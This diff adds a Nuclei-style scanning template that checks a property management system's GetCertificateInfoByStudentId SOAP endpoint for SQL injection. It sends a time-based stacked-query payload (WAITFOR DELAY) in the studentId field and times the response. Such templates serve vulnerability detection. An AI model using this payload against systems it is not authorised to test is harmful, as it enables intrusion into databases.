@@ -1,0 +1,54 @@
+id: poc-yaml-new-window-getcertificateinfobystudentid-sqli
+info:
+  name: 新视窗新一代物业管理系统 GetCertificateInfoByStudentId SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/loginV8.aspx?"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "BPMSite/ClientSupport/OCXInstall.aspx"
+      - type: status
+        status:
+          - 200
+  - method: POST
+    path:
+      - "{{BaseURL}}/OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+       <soap:Body>
+       <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
+      <studentId>1;WAITFOR DELAY '0:0:{{t1}}'--</studentId>
+      </GetCertificateInfoByStudentId>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<GetCertificateInfoByStudentIdResult>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
+      - type: status
+        status:
+          - 200
